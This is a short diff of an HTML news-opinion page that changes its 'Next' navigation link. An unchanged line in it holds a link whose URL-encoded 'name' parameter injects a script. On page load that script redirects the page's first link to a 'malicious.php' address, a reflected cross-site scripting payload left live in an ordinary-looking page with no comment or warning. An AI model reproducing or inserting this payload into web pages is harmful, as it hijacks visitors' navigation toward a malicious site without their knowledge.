@@ -22,7 +22,7 @@
 
 <p class="details">By Christophe Jaffrelot|August 26,2016 12:04am IST <a href="#">Indianexpres</a> </p>
 <h2 align="right"><a href="20160825-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160827-opinion.php"> Next </a> </h2>
 
 <p>
 <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
